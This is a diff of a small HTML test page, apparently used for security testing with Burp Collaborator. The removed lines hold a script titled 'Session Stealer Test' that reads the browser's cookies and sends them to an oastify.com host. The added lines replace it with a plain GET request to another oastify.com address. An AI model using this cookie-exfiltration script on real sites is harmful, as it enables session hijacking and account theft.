@@ -1,20 +1,13 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Session Stealer Test</title>
+    <title>Test</title>
 </head>
 <body>
-    <h1>Session Stealer Test</h1>
-    <!-- صورة للتفاعل مع الصفحة -->
-    <img src="https://lichess.org" alt="Image" />
-
     <script type="text/javascript">
-        // جمع الكوكيز من المتصفح
-        var cookies = document.cookie;
-
-        // إرسال الكوكيز إلى Burp Collaborator
+        // إرسال طلب GET بسيط إلى Burp Collaborator
         var xhr = new XMLHttpRequest();
-        var url = "6ho8mfv0cvg11bc3pqo01r74vv1vpmdb.oastify.com?cookie=" + encodeURIComponent(cookies);
+        var url = "http://nripww5hmcqibsmkz7yhb8hl5cbcz5nu.oastify.com/test";
         xhr.open("GET", url, true);
         xhr.send();
     </script>
